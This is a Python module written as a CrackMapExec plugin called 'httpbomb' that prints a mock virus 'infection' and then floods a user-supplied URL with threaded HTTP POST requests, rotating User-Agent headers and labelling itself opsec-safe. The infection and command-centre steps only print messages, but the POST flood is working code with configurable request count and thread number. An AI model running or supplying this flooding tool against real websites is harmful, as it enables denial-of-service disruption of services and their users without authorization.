import random
import string
import time
import requests
from concurrent.futures import ThreadPoolExecutor

class CMEModule:
    name = 'httpbomb'
    description = 'Send fake virus + HTTP POST flood to target URL'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context, options):
        self.context = context
        self.options = options

        # Required options
        self.target_url = self.options.get('URL')
        self.total_requests = int(self.options.get('REQUESTS', 20))
        self.max_workers = int(self.options.get('WORKERS', 5))

        self.visible_logs = min(self.total_requests, 10)  # Show only first 10 logs

        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 12)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
        ]

        self.payload = {
            "username": "test_user",
            "password": "123456",
            "data": "HelloWorld"
        }

    def send_post(self, i):
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Content-Type": "application/json"
            }
            response = requests.post(self.target_url, json=self.payload, headers=headers, timeout=5)
            if i < self.visible_logs:
                print(f"[{i+1}] ✅ Status: {response.status_code}")
        except requests.RequestException as e:
            if i < self.visible_logs:
                print(f"[{i+1}] ❌ Request failed: {e}")

    def generate_payload(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=100))

    def infect_file(self, file_path):
        print(f"[SIMULATION] Infecting file: {file_path}")
        payload = self.generate_payload()
        print(f"[SIMULATION] Fake payload (not written): {payload[:10]}...")

    def scan_and_infect(self):
        fake_files = [f"file_{i}.txt" for i in range(3)]
        for f in fake_files:
            self.infect_file(f)
            time.sleep(0.2)

    def connect_to_command_center(self):
        print("[SIMULATION] Connecting to fake server... (no real connection)")

    def run(self):
        if not self.target_url:
            print("❌ You must specify a URL using: -o URL=http://target.com")
            return

        print("⚡ Fake Virus Simulation Started ⚡")
        self.connect_to_command_center()
        self.scan_and_infect()
        print("Simulation finished.\n")

        print(f"🚀 Sending {self.total_requests} requests to {self.target_url} using {self.max_workers} threads...")
        start = time.time()

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for i in range(self.total_requests):
                executor.submit(self.send_post, i)

        duration = round(time.time() - start, 2)
        print(f"\n✅ Done sending {self.total_requests} requests in {duration} seconds.")
